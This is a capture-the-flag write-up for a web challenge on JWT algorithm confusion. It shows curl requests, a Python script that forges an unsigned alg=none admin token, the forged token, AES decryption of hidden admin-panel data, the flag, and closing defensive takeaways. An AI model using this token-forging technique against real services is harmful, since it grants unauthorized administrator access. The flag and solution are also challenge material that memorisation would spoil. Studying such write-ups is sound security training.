# JWT Confusion

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Challenge | JWT Confusion |
| Difficulty | Medium |
| Goal | Obtain administrator access and recover the hidden flag |

## Initial Reconnaissance

Visiting the login page:

```bash
curl -i https://csia-ctf26-jwt-confusion.chals.io/connexion
```

The HTML source contained a useful developer note:

```html
<!-- dev-note: compte de test non supprime -> etudiant:csia2026 -->
```

Credentials:

```text
etudiant:csia2026
```

## Authentication

I logged in with the test account:

```bash
curl -i \
  -d "username=etudiant&password=csia2026" \
  https://csia-ctf26-jwt-confusion.chals.io/connexion
```

The response set a session cookie containing a JWT:

```html
document.cookie = "session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

The cookie format was:

```text
session=<JWT>
```

## JWT Analysis

I decoded the JWT header and payload:

```python
import base64
import json

token = "JWT_HERE"

header, payload, signature = token.split(".")

for part in [header, payload]:
    padded = part + "=" * (-len(part) % 4)
    print(json.loads(base64.urlsafe_b64decode(padded)))
```

Header:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

Payload:

```json
{
  "username": "etudiant",
  "role": "etudiant"
}
```

## Vulnerability: alg=none

The challenge was vulnerable to the classic JWT `alg=none` issue.

The server trusted the JWT header and accepted unsigned tokens.

## Crafting an Admin Token

I generated a forged admin token:

```bash
python3 - <<'PY'
import base64
import json

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64(json.dumps({
    "alg": "none",
    "typ": "JWT"
}, separators=(",", ":")).encode())

payload = b64(json.dumps({
    "username": "admin",
    "role": "admin"
}, separators=(",", ":")).encode())

print(f"{header}.{payload}.")
PY
```

Generated token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

The final dot is important because it represents the empty signature segment.

## Admin Access

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'

curl -i -H "Cookie: session=$TOKEN" \
  https://csia-ctf26-jwt-confusion.chals.io/admin
```

This successfully granted access to the admin panel.

## Hidden Data

The admin panel contained:

```html
<div class="mono">
yJ5BCW8nBTmJu0JluXOf1rJxZJ5V85uEFtFO8IpvP0uRiCna3KdJumcrEgQEgPpp
</div>
```

The data looked Base64-encoded and encrypted.

## AES Decryption

A maintenance key was recoverable through:

```text
robots.txt
```

Key:

```text
pr0j3ct-m4int3n4nce
```

Encryption details:

- AES-CBC
- IV: `1234567890abcdef`
- Key: `MD5(pr0j3ct-m4int3n4nce)`

## Decryption Script

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import md5
import base64

ciphertext = base64.b64decode(
    "yJ5BCW8nBTmJu0JluXOf1rJxZJ5V85uEFtFO8IpvP0uRiCna3KdJumcrEgQEgPpp"
)

key = md5(b"pr0j3ct-m4int3n4nce").digest()
iv = b"1234567890abcdef"

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), 16)

print(plaintext.decode())
```

## Flag

```text
CSIA{jwt_c0nfus10n_CHDIIIIID_NTA_i}
```

## Key Takeaways

- Never allow `alg=none`.
- Enforce the expected JWT algorithm server-side.
- Do not trust user-controlled JWT headers.
- Sensitive maintenance keys should not be exposed.
- Predictable AES key derivation and static IVs are dangerous.

